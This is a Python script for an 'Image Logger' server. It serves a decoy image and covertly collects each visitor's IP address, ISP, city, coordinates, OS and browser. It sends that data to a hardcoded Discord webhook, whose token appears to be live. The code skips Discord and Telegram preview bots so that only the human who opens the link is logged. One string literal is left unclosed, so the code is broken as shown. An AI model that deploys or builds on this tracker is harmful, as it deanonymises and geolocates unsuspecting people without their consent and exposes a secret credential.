import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

config = {
    "webhook": "https://discord.com/api/webhooks/1367441811920126033/RZh4nmxwd-wa5uflYh03hkIHoCjdrKEKL-e3xzzNZQIERZydwVEU7nE8GfisOJkYUJbu",
    "image": "https://images.sftcdn.net/images/t_app-cover-m,f_auto/p/9848e854-ffae-11e6-a59d-00163ed833e7/3489861693/discord-screenshot.png",
    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,
    "vpnCheck": 1,
    "buggedImage": False,  # لا تستخدم صورة التحميل المشفرة
    "message": {
        "doMessage": False,
        "richMessage": False,
        "message": "IP Logged!"
    }
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent and useragent.startswith("TelegramBot"):
        return "Telegram"
    return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```"
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return

    bot = botCheck(ip, useragent)
    if bot:
        return

    ping = "@everyone"
    
    # 🛠 إصلاح: إزالة fields الغير مدعوم
    info = requests.get(f"http://ip-api.com/json/{ip}").json()
    if info.get("status") != "success":
        return

    if info.get("proxy") and config["vpnCheck"] == 2:
        return
    if info.get("proxy") and config["vpnCheck"] == 1:
        ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent or "")

    description = f"""**A User Opened the Original Image!**

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{info.get('lat', '?')}, {info.get('lon', '?')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**


    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": description
        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)
    return info

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            s = self.path
            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

            if config["imageArgument"] and (dic.get("url") or dic.get("id")):
                url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
            else:
                url = config["image"]

            data = f"""<style>body {{
                margin: 0;
                padding: 0;
            }}
            div.img {{
                background-image: url('{url}');
                background-position: center center;
                background-repeat: no-repeat;
                background-size: contain;
                width: 100vw;
                height: 100vh;
            }}</style><div class="img"></div>""".encode()

            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            user_agent = self.headers.get('user-agent')

            if ip.startswith(blacklistedIPs):
                return

            makeReport(ip, user_agent, endpoint=s.split("?")[0], url=url)

            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(data)

        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'500 - Internal Server Error<br>Please check the webhook for error logs.')
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

def run(server_class=HTTPServer, handler_class=ImageLoggerAPI, port=8080):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Server running on port {port}")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
